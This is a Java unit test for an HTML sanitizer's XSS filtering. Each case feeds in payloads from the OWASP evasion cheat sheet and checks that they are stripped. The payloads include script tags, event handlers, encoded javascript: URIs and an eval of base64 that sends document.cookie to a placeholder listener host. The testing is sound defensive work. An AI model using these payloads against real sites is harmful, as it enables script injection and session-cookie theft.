package org.entcore.common.utils;

import io.vertx.core.logging.Logger;
import io.vertx.core.logging.LoggerFactory;
import io.vertx.ext.unit.TestContext;
import io.vertx.ext.unit.junit.VertxUnitRunner;
import org.junit.BeforeClass;
import org.junit.Test;
import org.junit.runner.RunWith;

@RunWith(VertxUnitRunner.class)
public class HtmlUtilsTest {
    private static Logger log = LoggerFactory.getLogger(HtmlUtilsTest.class);


    void assertSame(final TestContext context, final String message, final String test) {
        final String cleaned = HtmlUtils.xssSanitize(test);
        context.assertEquals(cleaned, test, message);
    }

    void assertCleaned(final TestContext context, final String message, final String test) {
        assertCleaned(context, message, test, "");
    }

    void assertCleaned(final TestContext context, final String message, final String test, final String cleanValue) {
        final String cleaned = HtmlUtils.xssSanitize(test);
        context.assertEquals(cleanValue, cleaned, message);
    }

    @Test
    public void testXssInjection(final TestContext context) {
        assertSame(context, "should keep style attribute", "<div style=\"text-align: right;\"><span style=\"line-height: initial;\"></span></div>");
        assertSame(context, "should keep elements", "<ol><li><h2>Pièces jointes</h2><br /><video></video><audio></audio><article></article><section></section><p></p><b></b><i></i><br /></li></ol>");
        assertSame(context, "should keep class attributes", "<div class=\"download-attachments\"></div>");
        assertSame(context, "should keep relative href attributes", "<a href=\"/workspace/document/7690abdf-26a6-475f-970c-3550cf54c607\"></a>");
        assertSame(context, "should keep absolute href attributes", "<a href=\"https://google.com\"></a>");
        assertSame(context, "should keep src attributes", "<img alt=\"ok\" src=\"/workspace/document/7690abdf-26a6-475f-970c-3550cf54c607\" />");
        assertSame(context, "should keep tables", "<table class=\"\" style=\"cursor: nwse-resize;\"><tbody><tr><td><br /></td></tr></tbody></table>");
        assertSame(context, "should keep mathjax", "<mathjax class=\"ng-isolate-scope\" style=\"cursor: ns-resize;\"><div class=\"MathJax_CHTML_Display\"><span class=\"MathJax_CHTML\" id=\"MathJax-Element-2-Frame\"><span class=\"MJXc-math MJXc-display\" id=\"MJXc-Span-19\"><span class=\"MJXc-mrow\" id=\"MJXc-Span-20\"><span class=\"MJXc-mfrac\" id=\"MJXc-Span-21\" style=\"vertical-align: 0.25em;\"><span class=\"MJXc-box\"></span><span class=\"MJXc-mrow\" id=\"MJXc-Span-22\"><span class=\"MJXc-mo\" id=\"MJXc-Span-23\" style=\"margin-left: 0em; margin-right: 0.111em;\">−</span><span class=\"MJXc-mi MJXc-italic\" id=\"MJXc-Span-24\">b</span><span class=\"MJXc-mo\" id=\"MJXc-Span-25\" style=\"margin-left: 0.267em; margin-right: 0.267em;\">±</span><span class=\"MJXc-msqrt\" id=\"MJXc-Span-26\"><span class=\"MJXc-surd\"><span class=\"MJXc-right MJXc-scale10\" style=\"font-size: 166%; margin-top: 0.084em; margin-left: 0em;\">√</span></span><span class=\"MJXc-root\"><span class=\"MJXc-rule\" style=\"border-top: 0.08em solid;\"></span><span class=\"MJXc-box\"><span class=\"MJXc-msubsup\" id=\"MJXc-Span-27\"><span class=\"MJXc-mi MJXc-italic\" id=\"MJXc-Span-28\" style=\"margin-right: 0.05em;\">b</span><span class=\"MJXc-mn MJXc-script\" id=\"MJXc-Span-29\" style=\"vertical-align: 0.5em;\">2</span></span><span class=\"MJXc-mo\" id=\"MJXc-Span-30\" style=\"margin-left: 0.267em; margin-right: 0.267em;\">−</span><span class=\"MJXc-mn\" id=\"MJXc-Span-31\">4</span><span class=\"MJXc-mi MJXc-italic\" id=\"MJXc-Span-32\">a</span><span class=\"MJXc-mi MJXc-italic\" id=\"MJXc-Span-33\">c</span></span></span></span></span></span><span class=\"MJXc-box\" style=\"margin-top: -0.6em;\"><span class=\"MJXc-denom\"></span><span class=\"MJXc-rule\" style=\"border-top: 1px solid; margin: 0.1em 0px;\"></span><span class=\"MJXc-box\"><span class=\"MJXc-mrow\" id=\"MJXc-Span-34\"><span class=\"MJXc-mn\" id=\"MJXc-Span-35\">2</span><span class=\"MJXc-mi MJXc-italic\" id=\"MJXc-Span-36\">a</span></span></span></span></span></span></span></div>begin{equation}\n{-b \\pm \\sqrt{b^2-4ac} \\over 2a}\n\\end{equation}</mathjax>");
        //https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
        assertCleaned(context, "should not keep script element", "<script>alert('XSS')</script>");
        assertCleaned(context, "should not inject script with open brackets", "<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>", "&lt;");
        assertCleaned(context, "should not inject script with no closing tag", "<SCRIPT SRC=http://xss.rocks/xss.js?< B >");
        assertCleaned(context, "should not keep event attribute", "<div onclick=\"alert('XSS')\"></div>", "<div></div>");
        assertCleaned(context, "should not keep event with ng attribute", "<div ng-load=\"$eval.constructor('alert(0)')()\" ng-init=\"alert('XSS')\" /></div>", "<div></div>");
        assertCleaned(context, "should not keep js injection with \\0", "<img src=\"java\\0script:alert('XSS')\" />");
        assertCleaned(context, "should not keep js injection with meta char", "<img src=\" &#14; javascript:alert('XSS');\" />");
        assertCleaned(context, "should not keep js injection with non-alpha non-digit", "<div onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")></div>", "<div></div>");
        assertCleaned(context, "should not inject using img charcode", "<img src=javascript:alert(String.fromCharCode(88,83,83))/>");
        assertCleaned(context, "should not inject using img onerror", "<img src=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>", "<img src=\"/\" />");
        assertCleaned(context, "should not inject using img onerror encode", "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">", "<img src=\"x\" />");
        assertCleaned(context, "should not inject using img and html caracter", "<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;/>");
        assertCleaned(context, "should not inject using img and hex", "<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29/>");
        assertCleaned(context, "should not inject using img and base64", "<img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\"/>");
    }

}
